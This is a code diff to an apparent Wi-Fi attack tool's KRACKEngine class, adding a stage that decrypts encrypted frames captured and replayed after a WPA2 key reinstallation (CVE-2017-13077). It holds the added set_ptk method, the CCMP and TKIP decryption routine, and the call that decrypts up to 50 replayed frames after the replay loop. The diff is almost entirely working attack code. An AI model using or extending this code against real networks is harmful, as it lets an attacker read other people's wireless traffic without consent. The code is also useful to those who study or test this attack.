@@ -21,6 +21,27 @@ from scapy.layers.eap import EAPOL
 
 from .config import IS_WINDOWS, IS_LINUX, WIFI_BROADCAST, log
 
+# Optional crypto imports for post-reinstall decryption
+try:
+    from .ccmp import CCMPEngine, CCMPKey, ccmp_decapsulate
+    _HAS_CCMP = True
+except ImportError:
+    _HAS_CCMP = False
+
+try:
+    from .tkip import TKIPEngine, TKIPKey, TKIPRole
+    _HAS_TKIP = True
+except ImportError:
+    _HAS_TKIP = False
+
+try:
+    from .wpa2 import (
+        derive_ptk, extract_key_hierarchy, EAPOLKeyFrame, CipherSuite,
+    )
+    _HAS_WPA2 = True
+except ImportError:
+    _HAS_WPA2 = False
+
 
 class KRACKEngine:
     """
@@ -45,6 +66,92 @@ class KRACKEngine:
         self._key_reinstalled = False
         self._reinstall_count = 0
         self._max_replays = 10  # Safety limit on replay attempts
+
+        # Post-reinstall decryption state
+        self._ptk = None
+        self._cipher = 'ccmp'
+
+    def set_ptk(self, ptk, cipher='ccmp'):
+        """
+        Store a PTK for post-reinstall decryption attempts.
+
+        After key reinstallation, the PN counter resets to 0, allowing
+        decryption of replayed frames using the known PTK.
+
+        Args:
+            ptk: Pairwise Transient Key bytes (48 for CCMP, 64 for TKIP)
+            cipher: 'ccmp' or 'tkip'
+        """
+        self._ptk = ptk
+        self._cipher = cipher
+        log.info(f"KRACK: PTK set for post-reinstall decryption (cipher={cipher})")
+
+    def _attempt_decrypt_after_reinstall(self, frames, ptk=None):
+        """
+        Attempt to decrypt replayed encrypted frames after key reinstallation.
+
+        After key reinstallation (CVE-2017-13077), the PN counter resets to 0.
+        This allows decryption of captured frames using the known PTK with
+        PN starting from 0.
+
+        Args:
+            frames: List of scapy packets (encrypted data frames)
+            ptk: PTK bytes to use. If None, uses self._ptk.
+
+        Returns:
+            List of (frame_index, plaintext) tuples for successfully decrypted frames.
+        """
+        ptk = ptk or self._ptk
+        if ptk is None:
+            return []
+
+        cipher = self._cipher
+        results = []
+
+        for idx, frame in enumerate(frames):
+            if not frame.haslayer(Dot11):
+                continue
+
+            try:
+                dot11 = frame[Dot11]
+                # Extract MAC header (first 24 bytes of Dot11 layer)
+                raw_frame = raw(dot11)
+                mac_header = raw_frame[:24]
+
+                # Get the encrypted body (after MAC header)
+                # For protected frames, the body starts after the header
+                encrypted_body = raw_frame[24:]
+                if len(encrypted_body) < 16:
+                    continue
+
+                if cipher == 'ccmp' and _HAS_CCMP:
+                    ccmp_key = CCMPKey.from_ptk(ptk)
+                    plaintext = ccmp_decapsulate(ccmp_key.tk, mac_header,
+                                                encrypted_body)
+                    if plaintext:
+                        results.append((idx, plaintext))
+                        log.info(f"KRACK: Decrypted frame {idx} after reinstall (CCMP)")
+
+                elif cipher == 'tkip' and _HAS_TKIP:
+                    tkip_key = TKIPKey.from_ptk(ptk, TKIPRole.SUPPLICANT)
+                    da = mac_header[4:10]
+                    sa = mac_header[10:16]
+                    engine = TKIPEngine(tkip_key, ta=sa, ra=da,
+                                        role=TKIPRole.SUPPLICANT)
+                    engine.rx_tsc = -1  # PN reset after reinstall
+                    plaintext = engine.decapsulate(encrypted_body, da=da, sa=sa)
+                    if plaintext:
+                        results.append((idx, plaintext))
+                        log.info(f"KRACK: Decrypted frame {idx} after reinstall (TKIP)")
+
+            except Exception as e:
+                log.debug(f"KRACK: Frame {idx} decrypt attempt failed: {e}")
+                continue
+
+        if results:
+            log.info(f"KRACK: Successfully decrypted {len(results)} frames "
+                     f"after key reinstallation")
+        return results
 
     def start(self):
         """Start KRACK attack engine."""
@@ -208,6 +315,13 @@ class KRACKEngine:
                 break
 
         log.info(f"KRACK: Replayed {replayed} encrypted frames after key reinstall")
+
+        # Attempt decryption of replayed frames if PTK is available
+        if self._ptk is not None:
+            decrypted = self._attempt_decrypt_after_reinstall(
+                self._encrypted_frames[:50])
+            if decrypted:
+                log.info(f"KRACK: {len(decrypted)} frames decrypted post-reinstall")
 
     def get_stats(self):
         """Return KRACK attack statistics."""
